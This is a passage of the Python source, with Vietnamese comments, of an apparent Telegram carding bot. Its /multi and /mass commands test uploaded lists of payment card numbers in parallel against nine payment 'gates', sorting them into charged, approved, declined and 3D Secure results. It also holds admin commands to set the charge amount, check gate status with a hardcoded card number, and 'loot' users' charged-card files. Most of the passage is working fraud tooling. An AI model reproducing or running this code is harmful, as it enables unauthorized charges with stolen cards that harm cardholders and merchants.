                    status_text = "\n".join(status_lines)
                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Lỗi khi cập nhật tiến trình /multi: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Lỗi không xác định khi cập nhật tiến trình /multi: {e}")
                    last_update_time = time.time()
        
        duration = time.time() - start_time
        update_user_stats(user.id, user, counts)
        
        # <<< THAY ĐỔI: Thông báo dừng tool do Gate 9 lỗi >>>
        if gate9_abort_flag:
            await status_message.edit_text(
                f"?? **CHECK STOPPED - GATE 9 FAILED REPEATEDLY** ??\n\n"
                f"**Lý do:** Tác vụ đã bị dừng sau khi có hơn 10 thẻ lỗi liên tục (kể cả sau khi đã retry).\n"
                f"Điều này cho thấy cổng đang gặp sự cố nghiêm trọng. Vui lòng báo Admin.\n\n"
                f"**Gate đang dùng:** `{gate_name}`\n"
                f"**Thẻ lỗi cuối cùng:** `{gate_fail_card}`\n"
                f"**Đã xử lý trước khi dừng:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return

        if gate_died_flag:
            await status_message.edit_text(
                f"?? **CHECK STOPPED - GATE DIED** ??\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`",
                reply_markup=None
            )
            return
            
        if cancel_event.is_set():
            await status_message.edit_text(f"?? **Tác vụ đã được dừng theo yêu cầu.**\n\nĐã xử lý: {processed_count}/{total_lines} thẻ.", reply_markup=None)
            return
            
        final_header = [
            f"**?? Check Complete!**\n", f"**Gate Used:** `{gate_name}`",
            f"**Total Cards:** `{total_lines}`", f"**Time Taken:** `{duration:.2f}s`\n",
        ]
        final_counts = []
        if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
            final_counts.append(f"? **Charged:** `{counts['success']}`")
        final_counts.extend([
            f"? **Approved:** `{counts['live_success']}`", f"? **Declined:** `{counts['decline']}`",
            f"?? **3D Secure:** `{counts['custom']}`", f"?? **Invalid Format:** `{counts['invalid_format']}`",
            f"?? **Errors:** `{counts['error'] + counts['gate9_persistent_error']}`\n", f"-----------------------------------------"
        ])
        
        final_message = final_header + final_counts
        if results['live_success']: final_message.extend(("\n**? APPROVED:**", *results['live_success']))
        if results['success'] and (active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge')): final_message.extend(("\n**? CHARGED CARDS:**", *results['success']))
        if results['custom']: final_message.extend(("\n**?? 3D SECURE CARDS:**", *results['custom']))
        if results['decline']: final_message.extend(("\n**? DECLINED CARDS:**", *results['decline']))
        if results['invalid_format']: final_message.extend(("\n**?? INVALID FORMAT:**", *results['invalid_format']))
        if results['error']: final_message.extend(("\n**?? ERRORS:**", *results['error']))
        
        final_text = "\n".join(final_message)
        if len(final_text) > 4096:
            await status_message.edit_text("Kết quả quá dài để hiển thị. Sẽ được gửi dưới dạng file.", reply_markup=None)
            with io.BytesIO(final_text.encode('utf-8')) as file_to_send:
                await context.bot.send_document(chat_id=update.effective_chat.id, document=file_to_send, filename="multi_check_results.txt")
        else:
            await status_message.edit_text(final_text, reply_markup=None)
            
    except Exception as e:
        logger.error(f"Lỗi trong /multi: {e}", exc_info=True)
        await status_message.edit_text(f"?? **Lỗi nghiêm trọng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def mass_check_handler(update, context):
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
        return
    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return
    if user.id in ACTIVE_CHECKS:
        logger.warning(f"User {user.id} ({user.full_name}) tried to spam /mass.")
        await update.message.reply_text("Bạn đang có một tác vụ check khác đang chạy. Vui lòng chờ nó hoàn thành hoặc dùng /stop.", quote=True)
        return
    if not update.message.document: await update.message.reply_text("Please attach a .txt file."); return
    document = update.message.document
    if not document.file_name.lower().endswith('.txt'): await update.message.reply_text("Only .txt files are accepted."); return
    
    file = await context.bot.get_file(document.file_id)
    file_content = (await file.download_as_bytearray()).decode('utf-8')
    lines = [line for line in file_content.splitlines() if line.strip()]
    total_lines = len(lines)
    if not lines: await update.message.reply_text("?? The file is empty."); return
    
    if user.id != ADMIN_ID:
        user_limit = get_user_limit(user.id)
        if total_lines > user_limit:
            await update.message.reply_text(
                f"?? **Vượt quá giới hạn!**\n\n"
                f"Tệp của bạn có `{total_lines}` dòng, nhưng giới hạn của bạn là `{user_limit}` dòng.\n\n"
                f"Vui lòng liên hệ admin {ADMIN_USERNAME} để tăng hạn mức."
            )
            return
            
    caption = update.message.caption or "/mass"
    requested_threads_match = re.match(r'/mass(\d+)', caption)
    requested_threads = int(requested_threads_match.group(1)) if requested_threads_match and requested_threads_match.group(1) else 10
    
    if user.id != ADMIN_ID:
        num_threads = min(requested_threads, MEMBER_THREAD_LIMIT)
        if requested_threads > MEMBER_THREAD_LIMIT:
            await update.message.reply_text(
                f"?? **Giới hạn luồng!** Thành viên chỉ được dùng tối đa {MEMBER_THREAD_LIMIT} luồng. Đã tự động điều chỉnh.",
                quote=True
            )
    else:
        num_threads = requested_threads
    num_threads = max(1, num_threads)
    
    active_gate = get_active_gate()
    gate_name = get_formatted_gate_name(active_gate)
    session_timestamp = datetime.now(VIETNAM_TZ).strftime("%Y%m%d-%H%M%S")
    session_dir = os.path.join(LOG_DIR, str(user.id), session_timestamp)
    os.makedirs(session_dir, exist_ok=True)
    
    keyboard = [[InlineKeyboardButton("?? Dừng Task Của Tôi", callback_data=f"stop_mytask_{user.id}")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    status_message = await update.message.reply_text(f"? Khởi tạo... Chuẩn bị check `{total_lines}` thẻ với `{num_threads}` luồng qua **{gate_name}**.", reply_markup=reply_markup)
    
    start_time = time.time()
    cancel_event = threading.Event()
    try:
        ACTIVE_CHECKS[user.id] = { "full_name": user.full_name, "username": user.username, "start_time": time.time(), "task_type": "mass" }
        CANCELLATION_EVENTS[user.id] = cancel_event
        counts = {'success': 0, 'live_success': 0, 'decline': 0, 'custom': 0, 'error': 0, 'invalid_format': 0, 'unknown': 0, 'cancelled': 0, 'gate_dead': 0, 'gate9_persistent_error': 0}
        result_lists = {k: [] for k in counts.keys()}
        result_lists['error_debug'] = []
        processed_count = 0
        last_update_time = time.time()

        gate_died_flag = False
        gate_fail_card = ""
        gate9_abort_flag = False

        with ThreadPoolExecutor(max_workers=num_threads) as executor:
            future_to_line = {executor.submit(check_card, line, cancel_event): line for line in lines}
            for future in as_completed(future_to_line):
                if cancel_event.is_set():
                    break
                processed_count += 1
                try:
                    status, original_line, full_response, bin_info = future.result()
                    
                    if status == 'gate9_persistent_error':
                        counts['gate9_persistent_error'] += 1
                        result_lists['error'].append(f"{original_line} | GATE9_PERSISTENT_ERROR")
                        if counts['gate9_persistent_error'] > 10:
                            logger.error(f"GATE 9 ABORT: User {user.id} đã vượt quá 10 lỗi dai dẳng. Dừng tác vụ.")
                            gate9_abort_flag = True
                            gate_fail_card = original_line
                            cancel_event.set()
                    elif status == 'gate_dead':
                        counts['gate_dead'] += 1
                        gate_fail_card = original_line
                        gate_died_flag = True
                        cancel_event.set()
                        result_lists['error'].append(f"{original_line} | GATE DIED (Forbidden)")
                        continue

                    counts[status] = counts.get(status, 0) + 1
                    line_to_save = ""
                    if status == 'decline':
                        if full_response == 'VIETNAM_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (VN BIN)"
                        elif full_response == 'INVALID_BIN_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid BIN)"
                        elif full_response == 'EXPIRED_CARD_DECLINE': line_to_save = f"{original_line} | DECLINED (Expired)"
                        elif full_response == 'INVALID_CARDNUMBER_DECLINE': line_to_save = f"{original_line} | DECLINED (Invalid Card Number)"
                        else: line_to_save = f"{original_line} | DECLINED"
                    elif status == 'live_success':
                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        line_to_save = f"{original_line} | APPROVED? {bin_str}"
                    elif status == 'invalid_format': line_to_save = f"{original_line} | Reason: {full_response}"
                    elif status == 'cancelled' or status == 'gate9_persistent_error': continue
                    else:
                        bin_str = f"| {(bin_info.get('bank') or 'N/A')} - {(bin_info.get('type') or 'N/A')} - {(bin_info.get('brand') or 'N/A')} - {(bin_info.get('country_name') or 'N/A')}"
                        line_to_save = f"{original_line} {bin_str}"
                    
                    if line_to_save: result_lists[status].append(line_to_save)
                    
                    if status in ['error', 'unknown']:
                        debug_info = f"Card: {original_line}\nResponse: {str(full_response)[:3500]}"
                        result_lists['error_debug'].append(debug_info)
                        if user.id != ADMIN_ID:
                            await context.bot.send_message(chat_id=ADMIN_ID, text=f"?? DEBUG ALERT (user {user.id}):\n{debug_info}")

                except Exception as e:
                    original_line = future_to_line[future]
                    logger.error(f"Lỗi khi xử lý future cho thẻ {original_line} trong /mass: {e}", exc_info=True)
                    counts['error'] += 1
                    result_lists['error'].append(f"{original_line} | Lỗi xử lý: {e}")

                if gate9_abort_flag:
                    break

                if time.time() - last_update_time > 2.0 or processed_count == total_lines:
                    progress_bar = create_progress_bar(processed_count, total_lines, length=20)
                    cpu_usage = psutil.cpu_percent()
                    ram_usage = psutil.virtual_memory().percent
                    status_lines = [
                        f"**?? Checking in progress...**\n{progress_bar}\n",
                        f"?? **CPU:** `{cpu_usage}%` | **RAM:** `{ram_usage}%`",
                        f"**Gate:** `{gate_name}` | **Threads:** `{num_threads}`",
                        f"**Progress:** `{processed_count}/{total_lines}`\n"
                    ]
                    if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
                        status_lines.append(f"? **Charged:** `{counts['success']}`")
                    status_lines.extend([
                        f"? **Approved:** `{counts['live_success']}`",
                        f"? **Declined:** `{counts['decline']}`",
                        f"?? **3D Secure:** `{counts['custom']}`",
                        f"?? **Invalid Format:** `{counts['invalid_format']}`",
                        f"? **Errors:** `{counts['error'] + counts['gate9_persistent_error']}`"
                    ])
                    status_text = "\n".join(status_lines)
                    try:
                        current_reply_markup = reply_markup if not cancel_event.is_set() else None
                        await status_message.edit_text(text=status_text, reply_markup=current_reply_markup)
                    except telegram.error.BadRequest as e:
                        if "Message is not modified" not in str(e): logger.warning(f"Lỗi khi cập nhật tiến trình /mass: {e}")
                        pass
                    except Exception as e:
                        logger.error(f"Lỗi không xác định khi cập nhật tiến trình /mass: {e}")
                    last_update_time = time.time()

        duration = time.time() - start_time
        counts['cancelled'] = total_lines - processed_count
        
        if gate9_abort_flag:
            final_summary_text = (
                f"?? **CHECK STOPPED - GATE 9 FAILED REPEATEDLY** ??\n\n"
                f"**Lý do:** Tác vụ đã bị dừng sau khi có hơn 10 thẻ lỗi liên tục (kể cả sau khi đã retry).\n"
                f"Điều này cho thấy cổng đang gặp sự cố nghiêm trọng. Vui lòng báo Admin.\n\n"
                f"**Gate đang dùng:** `{gate_name}`\n"
                f"**Thẻ lỗi cuối cùng:** `{gate_fail_card}`\n"
                f"**Đã xử lý trước khi dừng:** `{processed_count}/{total_lines}`\n\n"
                f"Các kết quả đã xử lý sẽ được gửi đi."
            )
        elif gate_died_flag:
            final_summary_text = (
                f"?? **CHECK STOPPED - GATE DIED** ??\n\n"
                f"**Reason:** The gate is down (`Forbidden` error).\n"
                f"The process was stopped immediately.\n\n"
                f"**Gate Used:** `{gate_name}`\n"
                f"**Failing Card:** `{gate_fail_card}`\n"
                f"**Processed before stop:** `{processed_count}/{total_lines}`\n\n"
                f"Các kết quả đã xử lý sẽ được gửi đi."
            )
        elif cancel_event.is_set():
            final_summary_text = (
                f"?? **Tác vụ đã được dừng theo yêu cầu.**\n\n"
                f"Đã xử lý: {processed_count}/{total_lines} thẻ. Các kết quả đã xử lý sẽ được gửi đi."
            )
        else:
            summary_lines = [
                f"**?? Check Complete!**\n",
                f"**Gate Used:** `{gate_name}`",
                f"**Total:** `{total_lines}` | **Threads:** `{num_threads}`\n"
            ]
            if active_gate not in ['7', '8', '9'] or (active_gate == '8' and get_gate8_mode() == 'charge') or (active_gate == '9' and get_gate9_mode() == 'charge'):
                summary_lines.append(f"? **Charged:** `{counts['success']}`")
            summary_lines.extend([
                f"? **Approved:** `{counts['live_success']}`", f"? **Declined:** `{counts['decline']}`",
                f"?? **3D Secure:** `{counts['custom']}`", f"?? **Invalid Format:** `{counts['invalid_format']}`",
                f"? **Errors:** `{counts['error'] + counts['gate9_persistent_error']}`", f"?? **Cancelled:** `{counts['cancelled']}`\n",
                f"**?? Took:** `{duration:.2f}s`"
            ])
            final_summary_text = "\n".join(summary_lines)
            
        await status_message.edit_text(final_summary_text, reply_markup=None)
        
        summary_data = {'counts': counts, 'original_filename': document.file_name}
        save_json_file(os.path.join(session_dir, "summary.json"), summary_data)
        update_user_stats(user.id, user, counts)
        
        file_map = {
            'success': 'charged.txt', 'live_success': 'approved.txt', 'decline': 'declined.txt',
            'custom': '3d_secure.txt', 'invalid_format': 'invalid_format.txt',
            'error': 'errors.txt', 'unknown': 'unknown.txt'
        }
        for status, filename in file_map.items():
            if result_lists[status]:
                file_path = os.path.join(session_dir, filename)
                with open(file_path, 'w', encoding='utf-8') as f: f.write("\n".join(result_lists[status]))
                with open(file_path, 'rb') as doc: await context.bot.send_document(chat_id=update.effective_chat.id, document=doc)
                
        if user.id == ADMIN_ID and result_lists['error_debug']:
            debug_path = os.path.join(session_dir, "debug_admin.txt")
            with open(debug_path, 'w', encoding='utf-8') as f: f.write("\n\n---\n\n".join(result_lists['error_debug']))
            with open(debug_path, 'rb') as doc: await context.bot.send_document(chat_id=ADMIN_ID, document=doc)
            
    except Exception as e:
        logger.error(f"Lỗi trong mass_check: {e}", exc_info=True)
        await status_message.edit_text(f"?? **Lỗi nghiêm trọng!**\n```\n{str(e).replace('`', '')}\n```", reply_markup=None)
    finally:
        ACTIVE_CHECKS.pop(user.id, None)
        CANCELLATION_EVENTS.pop(user.id, None)

async def stop_command(update, context):
    user = update.effective_user
    target_user_id = user.id
    if user.id == ADMIN_ID and context.args:
        try: target_user_id = int(context.args[0])
        except (ValueError, IndexError):
            await update.message.reply_text("? User ID không hợp lệ. Cú pháp: `/stop <user_id>`"); return
    elif user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text("Bạn không có quyền dùng lệnh này."); return
    if target_user_id in CANCELLATION_EVENTS:
        CANCELLATION_EVENTS[target_user_id].set()
        if target_user_id == user.id:
            await update.message.reply_text("? Đã gửi yêu cầu dừng. Tác vụ sẽ dừng lại sau khi hoàn thành các thẻ đang check...")
        else:
            await update.message.reply_text(f"? Đã gửi yêu cầu dừng tác vụ của người dùng `{target_user_id}`.")
    else:
        if target_user_id == user.id:
            await update.message.reply_text("?? Bạn không có tác vụ /mass hoặc /multi nào đang chạy.")
        else:
            await update.message.reply_text(f"?? Người dùng `{target_user_id}` không có tác vụ nào đang chạy.")

async def active_checks_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not ACTIVE_CHECKS:
        await update.message.reply_text("? Hiện không có tác vụ check nào đang chạy.")
        return
    message = "????? **Các tác vụ đang hoạt động:**\n\n"
    now = time.time()
    keyboard = []
    active_checks_copy = dict(ACTIVE_CHECKS)
    for user_id, data in active_checks_copy.items():
        duration = now - data.get('start_time', now)
        username = f"@{data.get('username')}" if data.get('username') else "N/A"
        full_name = data.get('full_name', 'N/A')
        task_type = data.get('task_type', 'N/A').upper()
        message += (f"?? **User:** {full_name} ({username}) | ID: `{user_id}`\n"
                      f"   - **Lệnh:** `/{task_type}`\n"
                      f"   - **Thời gian chạy:** `{int(duration)}` giây\n"
                      f"--------------------\n")
        keyboard.append([InlineKeyboardButton(f"?? Dừng Task của {full_name}", callback_data=f"stop_task_{user_id}")])
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(message, reply_markup=reply_markup)

def _perform_gate_check(gate_id: str, card_line: str):
    cc, mes, ano, cvv = card_line.split('|')
    ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
    session = requests.Session()
    session.headers.update({"User-Agent": ua})
    try:
        bin_info = {}
        gate_functions = {
            '1': _check_card_gate1, '2': _check_card_gate2, '3': _check_card_gate3,
            '4': _check_card_gate4, '5': _check_card_gate5, '6': _check_card_gate6,
            '7': _check_card_gate7, '8': _check_card_gate8, '9': _check_card_gate9,
        }
        gate_func = gate_functions.get(gate_id)
        if not gate_func:
            return "Không xác định ?", "Gate ID không tồn tại"
        
        status, _, response_text, _ = gate_func(session, card_line, cc, mes, f"20{ano}", cvv, bin_info, ua, None)
        
        if status == 'gate_dead' or '{"message":"Forbidden"}' in str(response_text):
            return "Không hoạt động ??", response_text
        elif '"payment_status":"failed"' in str(response_text) or '"payment_source_status":"failed"' in str(response_text) or status == 'live_success' or status == 'success' or status == 'decline':
            return "Hoạt động ??", response_text
        else:
            return "Hoạt động ??", response_text
            
    except Exception as e:
        logger.error(f"Lỗi khi kiểm tra trạng thái Gate {gate_id}: {e}")
        return "Không hoạt động ??", str(e)

async def status_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    msg = await update.message.reply_text("? Đang kiểm tra trạng thái các cổng... Vui lòng chờ.")
    test_card = "4258818143133540|02|26|471"
    final_message = "**?? TRẠNG THÁI CỔNG THANH TOÁN ??**\n\n"
    gate_ids = ['1', '2', '3', '4', '5', '6', '7', '8', '9']
    
    with ThreadPoolExecutor(max_workers=len(gate_ids)) as executor:
        future_to_gate = {executor.submit(_perform_gate_check, gid, test_card): gid for gid in gate_ids}
        results = {}
        for future in as_completed(future_to_gate):
            gid = future_to_gate[future]
            try:
                status, response = future.result()
                results[gid] = (status, response)
            except Exception as e:
                results[gid] = ("Lỗi kiểm tra ??", str(e))
                
    for gid in sorted(results.keys()):
        status, response = results.get(gid, ("Không xác định", "Không có kết quả"))
        response_display = str(response)[:1000]
        gate_name = get_formatted_gate_name(gid)
        final_message += (
            f"**Cổng {gid}: {gate_name.split('(')[0].strip()}**\n"
            f"**Trạng thái:** {status}\n"
            f"**Phản hồi Server:**\n```\n{response_display}\n```\n"
            f"----------------------------------------\n"
        )
    await msg.edit_text(final_message)

async def gate_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        current_gate = get_active_gate()
        current_gate_name = get_formatted_gate_name(current_gate)
        await update.message.reply_text(f"?? Gate đang hoạt động: **{current_gate_name}**.\n\nDùng `/gate [1-9]` để thay đổi.")
        return
        
    new_gate = context.args[0]
    if new_gate == '8':
        keyboard = [[InlineKeyboardButton("?? Charge", callback_data="setgate8mode_charge"), InlineKeyboardButton("? Check Live", callback_data="setgate8mode_live"),]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Vui lòng chọn chế độ cho **Gate 8**:", reply_markup=reply_markup)
    elif new_gate == '9':
        keyboard = [[InlineKeyboardButton("?? Charge", callback_data="setgate9mode_charge"), InlineKeyboardButton("? Check Live", callback_data="setgate9mode_live"),]]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await update.message.reply_text("Vui lòng chọn chế độ cho **Gate 9**:", reply_markup=reply_markup)
    elif new_gate in ['1', '2', '3', '4', '5', '6', '7']:
        set_active_gate(new_gate)
        new_gate_name = get_formatted_gate_name(new_gate)
        await update.message.reply_text(f"? Đã chuyển cổng thanh toán sang: **{new_gate_name}**")
    else:
        await update.message.reply_text("? Cổng không hợp lệ. Vui lòng chọn `1`, `2`, `3`, `4`, `5`, `6`, `7`, `8` hoặc `9`.")

async def set_gate_range_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) != 3:
        await update.message.reply_text("Cú pháp: `/setgate <gate_id> <min_amount> <max_amount>`\nVí dụ: `/setgate 1 50 200` (charge từ 0.5$ đến 2.0$)")
        return
    try:
        gate_id, min_str, max_str = context.args
        if gate_id not in ['1', '2', '3', '4', '5', '6', '7', '8', '9']:
            await update.message.reply_text("? `gate_id` phải từ 1 đến 9.")
            return
        min_val = int(min_str)
        max_val = int(max_str)
        if min_val > max_val:
            await update.message.reply_text("? `min_amount` không được lớn hơn `max_amount`.")
            return
        if min_val < 0 or max_val < 0:
            await update.message.reply_text("? Số tiền phải là số dương.")
            return
    except (ValueError, IndexError):
        await update.message.reply_text("? Dữ liệu không hợp lệ. Vui lòng nhập số cho min và max.")
        return
        
    ranges = load_json_file(GATE_RANGES_FILE)
    ranges[gate_id] = {"min": min_val, "max": max_val}
    save_json_file(GATE_RANGES_FILE, ranges)
    new_gate_name = get_formatted_gate_name(gate_id)
    await update.message.reply_text(f"? Đã cập nhật thành công!\n**Gate {gate_id}** giờ sẽ charge ngẫu nhiên trong khoảng **{min_val/100:.2f}$ - {max_val/100:.2f}$**.\nTên hiển thị mới: `{new_gate_name}`")

async def turn_bot_off(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not is_bot_on():
        await update.message.reply_text("?? Bot đã ở trạng thái **Tắt** rồi."); return
    set_bot_status(False)
    await update.message.reply_text("? Đã **TẮT** bot. Bắt đầu gửi thông báo...")
    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Không thể gửi thông báo tắt bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"?? Thông báo bảo trì đã được gửi.\n- Thành công: {success_count}\n- Thất bại: {fail_count}")

async def turn_bot_on(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if is_bot_on():
        await update.message.reply_text("?? Bot đã ở trạng thái **Bật** rồi."); return
    set_bot_status(True)
    await update.message.reply_text("? Đã **BẬT** bot. Bắt đầu gửi thông báo...")
    authorized_users = load_users()
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        lang = get_user_lang(user_id) or 'en'
        message = MESSAGES_VI["bot_on"] if lang == 'vi' else MESSAGES_EN["bot_on"]
        try:
            await context.bot.send_message(chat_id=user_id, text=message)
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Không thể gửi thông báo bật bot cho user {user_id}: {e}")
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"?? Thông báo hoạt động đã được gửi.\n- Thành công: {success_count}\n- Thất bại: {fail_count}")

async def send_message_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if len(context.args) < 2:
        await update.message.reply_text("Cú pháp: `/send <user_id> <tin_nhắn>`"); return
    try: target_user_id = int(context.args[0])
    except ValueError: await update.message.reply_text("? User ID không hợp lệ."); return
    message_to_send = " ".join(context.args[1:])
    try:
        await context.bot.send_message(chat_id=target_user_id, text=f"?? **Tin nhắn từ Admin:**\n\n{message_to_send}")
        await update.message.reply_text(f"? Tin nhắn đã được gửi đến user `{target_user_id}`.")
    except Exception as e:
        await update.message.reply_text(f"? Gửi tin nhắn thất bại: `{e}`")

async def send_all_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/sendall <tin_nhắn>`"); return
    message_to_send = " ".join(context.args)
    authorized_users = load_users()
    if not authorized_users:
        await update.message.reply_text("?? Không có thành viên nào để gửi tin."); return
    await update.message.reply_text(f"?? Bắt đầu gửi tin nhắn đến `{len(authorized_users)}` thành viên...")
    success_count, fail_count = 0, 0
    for user_id in authorized_users:
        if user_id == ADMIN_ID: continue
        try:
            await context.bot.send_message(chat_id=user_id, text=f"?? **Thông báo từ Admin:**\n\n{message_to_send}")
            success_count += 1
        except Exception as e:
            fail_count += 1
            logger.warning(f"Không thể gửi broadcast đến user {user_id}: {e}")
        await asyncio.sleep(0.1)
    await update.message.reply_text(f"?? Gửi tin nhắn hoàn tất!\n- Thành công: `{success_count}`\n- Thất bại: `{fail_count}`")

async def show_check_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    stats = load_json_file(STATS_FILE)
    if not stats:
        await update.message.reply_text("Chưa có dữ liệu thống kê nào."); return
    message = "?? **THỐNG KÊ CHECK CỦA USER** ??\n\n"
    all_users_to_show = load_users()
    all_users_to_show.add(ADMIN_ID)
    for user_id in sorted(list(all_users_to_show)):
        user_id_str = str(user_id)
        data = stats.get(user_id_str)
        if isinstance(data, dict):
            username = data.get('username')
            user_display = f"@{escape_markdown(str(username))}" if username else f"ID: {user_id_str}"
            message += (f"?? **{user_display}** (`{user_id_str}`)\n"
                          f"  ? Charged: `{data.get('total_charged', 0)}`\n"
                          f"  ? Approved: `{data.get('total_live_success', 0)}`\n"
                          f"  ?? Custom: `{data.get('total_custom', 0)}`\n"
                          f"  ? Declined: `{data.get('total_decline', 0)}`\n"
                          f"  ? Lỗi: `{data.get('total_error', 0) + data.get('total_invalid', 0)}`\n"
                          f"  ?? Lần cuối: `{data.get('last_check_timestamp', 'Chưa check')}`\n"
                          f"--------------------\n")
        else:
            message += (f"?? **ID: {user_id_str}**\n"
                          f"  *Chưa từng check hoặc dữ liệu lỗi.*\n"
                          f"--------------------\n")
    if len(message) > 4096:
        with io.BytesIO(message.encode('utf-8')) as doc:
            await update.message.reply_document(document=doc, filename="stats.txt")
    else:
        await update.message.reply_text(message)


async def loot_file_command(update, context):
    if update.effective_user.id != ADMIN_ID: return
    if not context.args:
        await update.message.reply_text("Cú pháp: `/lootfile <user_id>`"); return
    target_user_id = context.args[0]
    user_log_dir = os.path.join(LOG_DIR, target_user_id)
    if not os.path.exists(user_log_dir) or not os.listdir(user_log_dir):
        await update.message.reply_text(f"Không tìm thấy lịch sử check cho user `{target_user_id}`."); return
    keyboard = [
        [InlineKeyboardButton("1. Lấy File Charge Gần Nhất", callback_data=f"loot_latestcharge_{target_user_id}")],
        [InlineKeyboardButton("2. Lấy Tất Cả File Charge", callback_data=f"loot_allcharge_{target_user_id}")],
        [InlineKeyboardButton("3. Chọn Từ Lịch Sử", callback_data=f"loot_history_{target_user_id}")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text(f"Chọn tùy chọn để lấy file của user `{target_user_id}`:", reply_markup=reply_markup)

# <<<--- CÁC LỆNH SITE CHECKER ---<<<
async def site_command(update, context):
    """Xử lý lệnh /site bằng cách gọi service site_checker.py."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
        return

    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    if not context.args:
        await update.message.reply_text("Sử dụng: `/site <website.com>`")
        return

    url_input = context.args[0]
    msg = await update.message.reply_text(f"? Đang kiểm tra trang `{url_input}`...")

    try:
        # Dữ liệu để gửi đến service
        payload = {
            "url": url_input,
            "username": user.username,
            "first_name": user.first_name
        }
        
        # Gọi service bằng requests (blocking) trong một thread riêng
        response = await asyncio.to_thread(
            requests.post, SITE_CHECKER_URL, json=payload, timeout=25
        )
        response.raise_for_status() # Báo lỗi nếu status code là 4xx hoặc 5xx
        
        result_data = response.json()
        result_message = result_data.get("result", "Lỗi: Không nhận được kết quả hợp lệ từ service.")
        
        await msg.edit_text(result_message, disable_web_page_preview=True)

    except requests.exceptions.RequestException as e:
        logger.error(f"Không thể kết nối đến Site Checker Service: {e}")
        await msg.edit_text(f"?? **Lỗi Service:**\nKhông thể kết nối đến dịch vụ kiểm tra website. Vui lòng báo cho admin: `{ADMIN_USERNAME}`")
    except Exception as e:
        logger.error(f"Lỗi trong /site command: {e}", exc_info=True)
        await msg.edit_text(f"?? **Lỗi Hệ Thống khi check site:**\n`{e}`")


async def sitem_command(update, context):
    """Xử lý lệnh /sitem bằng cách gọi service site_checker.py."""
    user = update.effective_user
    if user.id != ADMIN_ID and user.id not in load_users():
        await update.message.reply_text(f"Bạn không được phép sử dụng lệnh này. Vui lòng liên hệ Admin: {ADMIN_USERNAME}")
        return

    if user.id != ADMIN_ID and not is_bot_on():
        lang = get_user_lang(user.id) or 'en'
        message = MESSAGES_VI["bot_off"] if lang == 'vi' else MESSAGES_EN["bot_off"]
        await update.message.reply_text(message)
        return

    text_content = update.message.text.split('/sitem', 1)[-1].strip()
    if not text_content:
        await update.message.reply_text("Sử dụng: `/sitem` và dán danh sách website ở dòng dưới."); return

    url_pattern = r'(https?://)?([a-zA-Z0-9.-]+\.[a-zA-Z]{2,})'
    urls_to_check = [match[0] + match[1] for match in re.findall(url_pattern, text_content)]
    
    if not urls_to_check:
        await update.message.reply_text("Không tìm thấy URL hợp lệ nào để check."); return

